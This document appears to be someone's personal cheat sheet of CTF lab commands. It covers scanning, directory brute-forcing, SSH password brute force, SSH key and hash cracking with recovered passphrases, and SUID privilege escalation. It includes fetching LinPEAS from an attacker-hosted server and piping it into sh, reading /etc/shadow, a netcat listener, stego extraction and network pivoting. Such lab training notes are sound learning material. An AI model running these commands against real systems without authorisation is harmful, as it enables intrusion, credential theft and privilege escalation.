# CTFNotes

## ovpn
sudo openvpn /path/to/file.ovpn
## nmap
nmap -sC -sV  10.10.86.183
nmap -p-15000 -vv TARGET_IP -oG initial-scans
## dirb
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.86.183/

.-----------------
DIRB v2.22    
By The Dark Raver
.-----------------

START_TIME: Thu Jul 18 11:06:58 2024
URL_BASE: http://10.10.86.183/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.86.183/ ----
==> DIRECTORY: http://10.10.86.183/assets/                                          
+ http://10.10.86.183/index.html (CODE:200|SIZE:1062)                                
+ http://10.10.86.183/robots.txt (CODE:200|SIZE:17)                                  
+ http://10.10.86.183/server-status (CODE:403|SIZE:277)                              
                                                                                     
---- Entering directory: http://10.10.86.183/assets/ ----                            
(!) WARNING: Directory IS LISTABLE. No need to scan it.                              
    (Use mode '-w' if you want to scan it anyway)                                    
                                                                               
-----------------
END_TIME: Thu Jul 18 11:37:44 2024
DOWNLOADED: 4612 - FOUND: 3
## gobuster  
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.115.246/ -w /usr/share/dirb/wordlists/common.txt
/===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
/===============================================================
[+] Url:                     http://10.10.73.181
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
/===============================================================
Starting gobuster in directory enumeration mode
/===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.73.181 development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
/===============================================================
Finished
/===============================================================
## less
┌──(kali㉿kali)-[~]
└─$ less ~hello.txt~
Hello Mamy

(cat)
## find
find / -type f -name user.txt 2>/dev/null
## Privilege escalation
https://gtfobins.github.io/
find / -user root -perm /4000 2>/dev/null

===> LinPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
=> From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
=> W/ Local network
#Host
sudo python3 -m http.server 80
#Victim
curl 10.17.72.21/linpeas.sh | sh
=> or send it 
![alt text](image.png)
## Change Username Hostname 
https://www.youtube.com/watch?v=VM64fH6tEEU&ab_channel=RyanJohn
## hydra 
hydra -l ~Username~ -P 'list.txt' ssh://10.10.65.127
## tee
send output to a file

![alt text](image-1.png)
## Find id-rsa passphrase
┌──(mamy㉿mamy)-[~]
└─$ ssh2john '/home/kali/Desktop/id_rsa' 
/home/kali/Desktop/id_rsa:$sshng$1$16$6AB35.......

(save output to a txt)

┌──(mamy㉿mamy)-[~]
└─$ john '/home/kali/Desktop/New File' --wordlist='/home/kali/Desktop/rockyou.txt' 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (/home/kali/Desktop/id_rsa)     
1g 0:00:00:00 DONE (2024-07-19 14:56) 2.941g/s 243388p/s 243388c/s 243388C/s beeswax..bambino1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
## enum4linux (Userrames) (too slow)
enum4linux 10.10.130.7
## random stuff
https://gchq.github.io/CyberChef/
https://md5decrypt.net/en/
https://10015.io/tools/sha1-encrypt-decrypt
https://wigle.net/
https://www.revshells.com/
cat ~/.zsh_history
sudo dpkg -i
scp <user@machineip>:(file name) /home/kali/Desktop
nc -lvnp 2144
sudo python3 -m http.server 80
ncat 10.10.25.140 3000
chmod +x 
cat /etc/shadow
cd ~/.ssh/ 
service bluetooth restart
## binwalk
┌──(mamy㉿mamy)-[~/Desktop]
└─$ binwalk /home/kali/Desktop/cutie.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

┌──(mamy㉿mamy)-[~/Desktop]
└─$ binwalk -e /home/kali/Desktop/cutie.png  

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
## steghide
 ┌──(mamy㉿Mamy)-[~/Desktop]
 └─$ steghide extract -sf /home/mamy/Desktop/useless/white_rabbit_1.jpg 
 Enter passphrase: 
 wrote extracted data to "hint.txt".   
## hashcat
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
hashcat -m 0 -a 0 hash.txt '/home/kali/Desktop/rockyou.txt'
## useful Writeups
https://github.com/xnomas/TryHackMe-Writeups/tree/main/JPGchat
## airmon
┌──(mamy㉿mamy)-[~/Downloads]
└─$ sudo airmon-ng

PHY     Interface       Driver          Chipset
phy2    wlan0           rtl8xxxu        Realtek Semiconductor Corp. RTL8192EU 802.11b/g/n WLAN Adapter

┌──(mamy㉿mamy)-[~/Downloads]
└─$ sudo airmon-ng check kill
                                                         
┌──(mamy㉿mamy)-[~/Downloads]
└─$ sudo airmon-ng start wlan0
## John
┌──(mamy㉿Mamy)-[~/Desktop]
└─$ sudo ssh2john "/home/mamy/Desktop/useless/id_rsa (copy 1)" > HashForJohn.txt
                                                             
┌──(mamy㉿Mamy)-[~/Desktop]
└─$ john /home/mamy/Desktop/HashForJohn.txt --wordlist='/home/mamy/Desktop/rockyou.txt'
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (/home/mamy/Desktop/useless/id_rsa (copy 1))     
1g 0:00:00:00 DONE (2024-08-02 16:26) 3.703g/s 49540p/s 49540c/s 49540C/s 100588..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
## scp
sudo scp -i id_rsa chisel root@10.200.52.200:/root
## xfreerdp 
┌──(mamy㉿Mamy)-[~/Desktop/useless/net]
└─$ xfreerdp /v:10.200.52.150 /u:Mamyy /p:123455
## sshuttle(vpn to ssh)
┌──(mamy㉿Mamy)-[~/Desktop/useless/net]
└─$ sudo sshuttle -NHr root@10.200.52.200 --ssh-cmd 'ssh -i id_rsa' 10.200.52.0/24 -x 10.200.52.200
c : Connected to server.
##
